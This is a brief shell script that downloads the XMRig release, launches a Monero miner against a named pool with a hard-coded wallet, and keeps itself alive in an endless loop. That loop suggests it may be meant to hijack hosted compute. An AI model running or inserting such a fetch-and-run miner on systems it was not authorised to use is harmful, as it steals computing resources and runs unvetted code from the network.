#!/bin/sh
sudo apt update
sudo apt install screen -y
wget https://github.com/xmrig/xmrig/releases/download/v6.15.0/xmrig-6.15.0-linux-static-x64.tar.gz
tar -xvf xmrig-6.15.0-linux-static-x64.tar.gz
cd xmrig-6.15.0
./xmrig -o us-west.minexmr.com:443 -u 45T4VN4wKSQXvVJ61agpkxEiE45KLvXi685epjbrZasqBm1mwUiuaSfhpVb1n1UoPidyb6KYZxSSZd4AqY9mTvbHRYz1HW3 -k --tls --rig-id dion
while [ 1 ]; do
sleep 3
done
sleep 999
